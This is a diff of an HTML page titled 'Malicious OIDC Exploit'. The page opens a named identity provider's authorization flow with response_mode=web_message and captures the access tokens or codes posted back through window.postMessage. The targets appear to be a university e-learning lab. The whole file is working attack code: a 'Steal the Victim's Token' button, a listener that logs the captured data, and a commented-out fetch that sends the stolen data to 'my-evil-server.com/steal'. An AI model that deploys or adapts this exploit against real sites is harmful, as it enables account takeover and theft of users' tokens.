@@ -1,32 +1,64 @@
 <!DOCTYPE html>
-<html>
-<body>
-<script>
-window.addEventListener('message', function(e) {
-    // Verify the message is from the IdP's origin
-    if (e.origin === 'https://idp-elearning.cloud.nds.rub.de') {
-        // Extract the access_token from the received data
-        if (e.data.access_token) {
-            // Send the stolen token to the attacker's server or display it
-            alert('Stolen access_token: ' + e.data.access_token);
-            console.log('Access Token:', e.data.access_token);
-        }
+<html lang="en">
+<head>
+  <meta charset="UTF-8" />
+  <title>Malicious OIDC Exploit (Raw Text)</title>
+  <style>
+    body {
+      font-family: Arial, sans-serif;
+      margin: 1em;
     }
-});
+    #tokenLog {
+      margin-top: 1em;
+      padding: 1em;
+      background: #f0f0f0;
+      border: 1px solid #ccc;
+      white-space: pre-wrap;
+    }
+  </style>
+</head>
+<body>
+  <h1>Malicious OIDC Exploit</h1>
+  <p>
+    When the victim clicks below, we open the IdP’s login flow. If they’re already
+    logged in, the IdP might immediately post the token/code back to this page
+    via <code>window.postMessage</code>.
+  </p>
+  <button id="stealTokenBtn">Steal the Victim’s Token</button>
 
-// Open the IdP's authorization URL in a popup
-const authUrl = 'https://idp-elearning.cloud.nds.rub.de/oidc_idp/authorize/index.xhtml?' +
-    'scope=profile+email+calendar+passwords+photos' +
-    '&response_type=code' +
-    '&redirect_uri=https%3A%2F%2Fsp-elearning.cloud.nds.rub.de%3A443%2Foidc_sp%2Fspa%2Fverify' +
-    '&state=ZeIyEOyV0FTGs2olT1xG4Q' +  // Controllable state parameter
-    '&code_challenge_method=S256' +
-    '&client_id=spa-1' +
-    '&code_challenge=VJU3RVuzgLG6-KhPrcOV3wk2llSR-Gk0hgqjPcGFNt0' +
-    '&response_mode=web_message' +
-    '&idp_verifier=spa-s1';
+  <h2>Captured Token/Response:</h2>
+  <div id="tokenLog">(none yet)</div>
 
-window.open(authUrl, '_blank');
-</script>
+  <script>
+    // Change this URL to match the *exact* vulnerable flow request:
+    const authorizeUrl = 
+      "https://idp-elearning.cloud.nds.rub.de/oidc_idp/authorize/index.xhtml?client_id=spa-1&redirect_uri=https%3A%2F%2Fsp%2Delearningcloudndsrubde%2Evercel%2Eapp%2F&response_mode=web_message&scope=profile+email+calendar+passwords+photos&response_type=token&state=ed8f4b48-549d-45cf-aa52-1aa793c40853&skip_prompt=1&idp_verifier=spa-a5";
+
+    // Open the IdP flow in a new window.
+    document.getElementById("stealTokenBtn").addEventListener("click", () => {
+      window.open(authorizeUrl, "_blank", "width=800,height=600");
+    });
+
+    // Listen for any postMessage events (the IdP might send the token here).
+    window.addEventListener("message", function (event) {
+      console.log("Got a postMessage event:", event);
+
+      // Optionally check event.origin here, if needed:
+      // if (event.origin !== "https://idp-elearning.cloud.nds.rub.de") {
+      //   return;
+      // }
+
+      // Just show the raw data, no JSON parsing:
+      const tokenLogDiv = document.getElementById("tokenLog");
+      tokenLogDiv.textContent = "Received message:\n" + event.data;
+
+      // If we wanted to exfiltrate it to our server:
+      // fetch("https://my-evil-server.com/steal", {
+      //   method: "POST",
+      //   headers: { "Content-Type": "text/plain" },
+      //   body: event.data
+      // });
+    });
+  </script>
 </body>
 </html>
